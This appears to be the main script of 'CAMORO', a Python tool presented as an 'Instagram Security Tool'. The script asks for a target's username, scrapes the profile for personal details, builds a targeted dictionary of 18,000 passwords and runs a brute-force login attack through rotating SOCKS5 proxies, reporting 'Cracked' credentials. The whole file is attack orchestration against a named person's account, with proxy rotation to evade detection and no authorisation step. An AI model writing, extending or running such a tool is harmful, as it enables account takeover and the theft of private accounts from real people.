#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🐫 CAMORO — Geonode SOCKS5 + AI Edition
Instagram Security Tool — OSINT · Dictionary · Brute
10 Elite Proxies · AI Controller · Auto-Healing
"""
import os
import sys
import traceback

# Add project root to path
ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

from core.banner import (
    clear, show_banner, info, ok, warn, err, ai, C,
    step, ask, yesno, menu,
)
from core.session import Session
from core.proxy import ProxyManager
from core.osint import OSINT
from core.interviewer import Interviewer
from core.wordlist import WordlistAI
from core.brute import BruteForce
from core.ai.controller import AIController


# ═══════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════

def main():
    clear()
    show_banner()

    # ── Init AI ──
    ai_controller = AIController()

    # ── Username ──
    username = ask("Target Instagram username / يوزر الهدف")
    if not username:
        err("Username required!")
        sys.exit(1)

    username = username.strip().lstrip("@")
    info(f"Target: @{username}")

    # ── Init Proxy Manager (auto-fetch Geonode) ──
    ai("Initializing proxy pool (Geonode SOCKS5 API)...")
    proxy_manager = ProxyManager(
        auto_fetch=True,
        pool_size=10,
        country="",
        ai_brain=ai_controller,
    )

    if proxy_manager.count == 0:
        warn("No proxies available — will run DIRECT (slower, riskier)")

    # ── Variables ──
    output_dir = "output"
    osint_data = {}
    answers = {}
    wordlist_path = ""
    wordlist = []

    # ── Menu loop ──
    while True:
        print()
        menu_items = [
            "OSINT — Gather profile information",
            "DICTIONARY — Generate targeted wordlist",
            "BRUTE FORCE — Start password attack",
            "FULL ATTACK — OSINT + Interview + Dict + Brute",
            "RESUME — Continue from saved progress",
            "PROXY STATUS — View proxy pool",
            "AI STATUS — View AI brain state",
            "EXIT",
        ]
        choice = menu(menu_items, "CAMORO MENU")

        # ── OSINT ──
        if choice == 1:
            step(1, 1, "OSINT RECONNAISSANCE")
            proxy_url = proxy_manager.get_next() if proxy_manager.count > 0 else None
            osint = OSINT(
                username=username,
                output_dir=output_dir,
                proxy=proxy_url,
            )
            osint_data = osint.scrape()
            if not osint_data:
                warn("OSINT failed — you can fill Interview manually")
                osint_data = osint.data or {}

        # ── DICTIONARY ──
        elif choice == 2:
            step(2, 2, "DICTIONARY GENERATION")

            # Load OSINT if available
            hints = {}
            if osint_data and osint_data.get("username"):
                osint_obj = OSINT(username, output_dir)
                osint_obj.data = osint_data
                hints = osint_obj.get_hints()

            # Interview
            interviewer = Interviewer(username, hints=hints, output_dir=output_dir)
            answers = interviewer.run()

            # Generate wordlist
            wl = WordlistAI(answers, target_count=18000)
            wl.generate()
            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
            wl.save(wordlist_path)
            wordlist = WordlistAI.load(wordlist_path)
            print()
            ok(wl.report())
            ok(f"Saved → {wordlist_path}")

        # ── BRUTE FORCE ──
        elif choice == 3:
            if not wordlist:
                wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
                if os.path.isfile(wordlist_path):
                    wordlist = WordlistAI.load(wordlist_path)
                    info(f"Loaded dictionary: {len(wordlist)} passwords")
                else:
                    warn("No dictionary found! Run DICTIONARY first (menu 2)")
                    continue

            step(3, 4, "BRUTE FORCE ATTACK")
            if not yesno(f"Start brute force with {len(wordlist)} passwords?", True):
                info("Cancelled")
                continue

            brute = BruteForce(
                username=username,
                wordlist=wordlist,
                output_dir=output_dir,
                proxy_manager=proxy_manager,
                delays=(3, 5),
                ai_brain=ai_controller,
            )

            try:
                result = brute.run()
                if result:
                    ok(f"Cracked: @{username} : {result.get('password','?')}")
                else:
                    warn("Password not found in current dictionary")
            except KeyboardInterrupt:
                print()
                warn("Interrupted — progress saved")
                brute.stop()

        # ── FULL ATTACK ──
        elif choice == 4:
            step(1, 4, "OSINT")
            proxy_url = proxy_manager.get_next() if proxy_manager.count > 0 else None
            osint = OSINT(username, output_dir, proxy=proxy_url)
            osint_data = osint.scrape()

            step(2, 4, "DICTIONARY")
            hints = {}
            if osint_data:
                osint_obj = OSINT(username, output_dir)
                osint_obj.data = osint_data
                hints = osint_obj.get_hints()
            interviewer = Interviewer(username, hints=hints, output_dir=output_dir)
            answers = interviewer.run()
            wl = WordlistAI(answers, target_count=18000)
            wl.generate()
            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
            wl.save(wordlist_path)
            wordlist = WordlistAI.load(wordlist_path)
            ok(wl.report())

            step(3, 4, "BRUTE FORCE")
            if not yesno(f"Start attack with {len(wordlist)} passwords?", True):
                info("Skipping brute force")
                continue

            brute = BruteForce(
                username=username,
                wordlist=wordlist,
                output_dir=output_dir,
                proxy_manager=proxy_manager,
                delays=(3, 5),
                ai_brain=ai_controller,
            )
            try:
                result = brute.run()
                if result:
                    ok(f"Cracked: @{username} : {result.get('password','?')}")
                else:
                    warn("Password not found")
            except KeyboardInterrupt:
                print()
                warn("Interrupted — progress saved")
                brute.stop()

        # ── RESUME ──
        elif choice == 5:
            step(5, 5, "RESUME ATTACK")
            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
            if not os.path.isfile(wordlist_path):
                err("No wordlist found! Run DICTIONARY first")
                continue
            wordlist = WordlistAI.load(wordlist_path)
            info(f"Loaded {len(wordlist)} passwords")

            brute = BruteForce(
                username=username,
                wordlist=wordlist,
                output_dir=output_dir,
                proxy_manager=proxy_manager,
                delays=(3, 5),
                ai_brain=ai_controller,
            )
            try:
                result = brute.run()
                if result:
                    ok(f"Cracked: @{username} : {result.get('password','?')}")
                else:
                    warn("Password not found")
            except KeyboardInterrupt:
                print()
                warn("Interrupted — progress saved")
                brute.stop()

        # ── PROXY STATUS ──
        elif choice == 6:
            proxy_manager.show_stats()

        # ── AI STATUS ──
        elif choice == 7:
            ai_controller.status()

        # ── EXIT ──
        elif choice == 8:
            print()
            info("CAMORO shutting down...")
            ai_controller.memory.save()
            ok("Goodbye!")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        ok("Goodbye!")
        sys.exit(0)
    except Exception as e:
        err(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)
